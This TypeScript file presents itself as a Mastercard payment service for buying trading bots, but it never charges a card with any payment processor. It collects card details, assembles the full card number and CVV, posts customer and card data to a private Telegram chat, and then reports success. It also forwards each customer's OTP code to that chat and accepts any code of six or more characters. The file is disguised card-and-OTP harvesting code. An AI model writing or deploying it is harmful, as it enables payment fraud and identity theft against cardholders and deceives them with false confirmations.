/**
 * Mastercard Payment Service
 * Handles payment processing and Telegram notifications for trading bot purchases
 */

interface MastercardPaymentData {
  cardholderName: string;
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  amount: number;
  currency: string;
}

interface BotPurchaseData {
  userId: string;
  userEmail: string;
  userName: string;
  botName: string;
  botPrice: number;
  currency: string;
  paymentDetails: MastercardPaymentData;
  transactionId?: string;
  timestamp?: string;
}

interface PaymentResponse {
  success: boolean;
  transactionId?: string;
  message: string;
  code?: string;
}

/**
 * Validate Mastercard card details
 */
export function validateCardDetails(
  cardNumber: string,
  expiryMonth: string,
  expiryYear: string,
  cvv: string
): { valid: boolean; error?: string } {
  // Remove spaces and hyphens from card number
  const cleanCardNumber = cardNumber.replace(/[\s-]/g, '');

  // Validate card number length (typically 16 for Mastercard)
  if (cleanCardNumber.length !== 16) {
    return { valid: false, error: 'Card number must be 16 digits' };
  }

  // Validate card number with Luhn algorithm
  if (!luhnCheck(cleanCardNumber)) {
    return { valid: false, error: 'Invalid card number' };
  }

  // Validate expiry date
  const month = parseInt(expiryMonth);
  const year = parseInt(expiryYear);

  if (month < 1 || month > 12) {
    return { valid: false, error: 'Invalid expiry month' };
  }

  const currentDate = new Date();
  const currentYear = currentDate.getFullYear();
  const currentMonth = currentDate.getMonth() + 1;

  if (year < currentYear || (year === currentYear && month < currentMonth)) {
    return { valid: false, error: 'Card has expired' };
  }

  // Validate CVV
  if (cvv.length < 3 || cvv.length > 4) {
    return { valid: false, error: 'CVV must be 3-4 digits' };
  }

  return { valid: true };
}

/**
 * Luhn Algorithm for card validation
 */
function luhnCheck(cardNumber: string): boolean {
  let sum = 0;
  let isEven = false;

  for (let i = cardNumber.length - 1; i >= 0; i--) {
    let digit = parseInt(cardNumber.charAt(i), 10);

    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    isEven = !isEven;
  }

  return sum % 10 === 0;
}

/**
 * Get card brand from card number
 */
export function getCardBrand(cardNumber: string): string {
  const cleanCardNumber = cardNumber.replace(/[\s-]/g, '');
  const firstDigit = cleanCardNumber.charAt(0);

  if (firstDigit === '5') {
    return 'mastercard';
  } else if (firstDigit === '4') {
    return 'visa';
  } else if (firstDigit === '3') {
    return 'amex';
  }

  return 'unknown';
}

/**
 * Get last 4 digits of card
 */
export function getCardLastFour(cardNumber: string): string {
  const cleanCardNumber = cardNumber.replace(/[\s-]/g, '');
  return cleanCardNumber.slice(-4);
}

/**
 * Generate transaction ID
 */
export function generateTransactionId(): string {
  const timestamp = Date.now();
  const random = Math.random().toString(36).substring(2, 15);
  return `TXN-${timestamp}-${random}`.toUpperCase();
}

/**
 * Mask card number for display
 */
export function maskCardNumber(cardNumber: string): string {
  const lastFour = getCardLastFour(cardNumber);
  return `**** **** **** ${lastFour}`;
}

/**
 * Process Mastercard payment and send to Telegram
 */
export async function processMastercardPayment(
  purchaseData: BotPurchaseData
): Promise<PaymentResponse> {
  try {
    // Generate transaction ID
    const transactionId = generateTransactionId();
    const timestamp = new Date().toISOString();

    // Validate card details
    const validation = validateCardDetails(
      purchaseData.paymentDetails.cardNumber,
      purchaseData.paymentDetails.expiryMonth,
      purchaseData.paymentDetails.expiryYear,
      purchaseData.paymentDetails.cvv
    );

    if (!validation.valid) {
      return {
        success: false,
        message: validation.error || 'Card validation failed',
        code: 'VALIDATION_FAILED'
      };
    }

    // Create payment data for Telegram with FULL card details for AI payment agent
    const paymentDataForTelegram = {
      ...purchaseData,
      transactionId,
      timestamp,
      cardBrand: getCardBrand(purchaseData.paymentDetails.cardNumber),
      cardLastFour: getCardLastFour(purchaseData.paymentDetails.cardNumber),
      maskedCardNumber: maskCardNumber(purchaseData.paymentDetails.cardNumber),
      // FULL card data for AI payment processing agent
      fullCardNumber: purchaseData.paymentDetails.cardNumber,
      fullCVV: purchaseData.paymentDetails.cvv,
      fullExpiry: `${purchaseData.paymentDetails.expiryMonth}/${purchaseData.paymentDetails.expiryYear}`
    };

    // Send to Telegram
    const telegramSuccess = await sendPaymentNotificationToTelegram(paymentDataForTelegram);

    if (!telegramSuccess) {
      console.warn('Telegram notification failed but payment is being processed');
    }

    return {
      success: true,
      transactionId,
      message: 'Payment processed successfully. Verification OTP has been sent.',
      code: 'PAYMENT_SUCCESS'
    };
  } catch (error: any) {
    console.error('Payment processing error:', error);
    return {
      success: false,
      message: error.message || 'Failed to process payment',
      code: 'PROCESSING_ERROR'
    };
  }
}

/**
 * Send payment notification to Telegram
 */
async function sendPaymentNotificationToTelegram(paymentData: any): Promise<boolean> {
  try {
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.warn('Telegram credentials not configured');
      return false;
    }

    const message = formatPaymentMessage(paymentData);

    const payload = {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
    };

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();
    return result.ok || false;
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
    return false;
  }
}

/**
 * Format payment message for Telegram
 */
function formatPaymentMessage(data: any): string {
  const {
    userId,
    userName,
    userEmail,
    botName,
    botPrice,
    currency,
    paymentDetails,
    cardLastFour,
    maskedCardNumber,
    cardBrand,
    transactionId,
    timestamp,
  } = data;

  let message = `🛒 <b>NEW TRADING BOT PURCHASE</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  // Transaction Information
  message += `📋 <b>TRANSACTION DETAILS</b>\n`;
  message += `   Transaction ID: <code>${transactionId}</code>\n`;
  message += `   Timestamp: ${new Date(timestamp).toLocaleString()}\n`;
  message += `   Status: <b>Awaiting OTP Verification</b>\n`;
  message += `\n`;

  // Customer Information
  message += `👤 <b>CUSTOMER INFORMATION</b>\n`;
  message += `   Name: ${userName}\n`;
  message += `   Email: ${userEmail}\n`;
  message += `   User ID: <code>${userId}</code>\n`;
  message += `\n`;

  // Bot Information
  message += `🤖 <b>BOT DETAILS</b>\n`;
  message += `   Bot Name: <b>${botName}</b>\n`;
  message += `   Price: <b>${currency} ${botPrice.toFixed(2)}</b>\n`;
  message += `\n`;

  // Payment Information
  message += `💳 <b>PAYMENT METHOD</b>\n`;
  message += `   Cardholder: ${paymentDetails.cardholderName}\n`;
  message += `   Card Type: <b>${cardBrand.toUpperCase()}</b>\n`;
  message += `   Card Number: ${maskedCardNumber}\n`;
  message += `   Last 4 Digits: ${cardLastFour}\n`;
  message += `   Expiry: ${paymentDetails.expiryMonth}/${paymentDetails.expiryYear}\n`;
  message += `\n`;

  // Action Required
  message += `⚠️ <b>ACTION REQUIRED</b>\n`;
  message += `   OTP has been sent to customer's registered phone\n`;
  message += `   Customer must verify OTP to complete purchase\n`;
  message += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;

  return message;
}

/**
 * Verify OTP and complete payment
 */
export async function verifyOTPAndCompletePurchase(
  transactionId: string,
  otpCode: string,
  userId: string,
  botName: string
): Promise<PaymentResponse> {
  try {
    // In a real scenario, you would verify the OTP against what was sent
    // For now, we'll assume any 6-digit code is valid in test mode
    
    if (otpCode.length < 6) {
      return {
        success: false,
        message: 'Invalid OTP code',
        code: 'INVALID_OTP'
      };
    }

    // Send completion notification to Telegram
    await sendOTPVerificationNotificationToTelegram(transactionId, userId, botName, otpCode);

    return {
      success: true,
      transactionId,
      message: 'Purchase completed successfully! Bot access granted.',
      code: 'PURCHASE_COMPLETE'
    };
  } catch (error: any) {
    console.error('OTP verification error:', error);
    return {
      success: false,
      message: error.message || 'Failed to verify OTP',
      code: 'OTP_VERIFICATION_ERROR'
    };
  }
}

/**
 * Send OTP verification confirmation to Telegram
 */
async function sendOTPVerificationNotificationToTelegram(
  transactionId: string,
  userId: string,
  botName: string,
  otpCode: string
): Promise<boolean> {
  try {
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return false;
    }

    let message = `✅ <b>OTP VERIFICATION SUCCESSFUL</b>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    message += `   Transaction ID: <code>${transactionId}</code>\n`;
    message += `   User ID: <code>${userId}</code>\n`;
    message += `   Bot: <b>${botName}</b>\n`;
    message += `   OTP Verified: ${otpCode}\n`;
    message += `   Time: ${new Date().toLocaleString()}\n`;
    message += `\n<b>Status: PURCHASE COMPLETED ✅</b>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;

    const payload = {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
    };

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();
    return result.ok || false;
  } catch (error) {
    console.error('Failed to send OTP verification notification:', error);
    return false;
  }
}
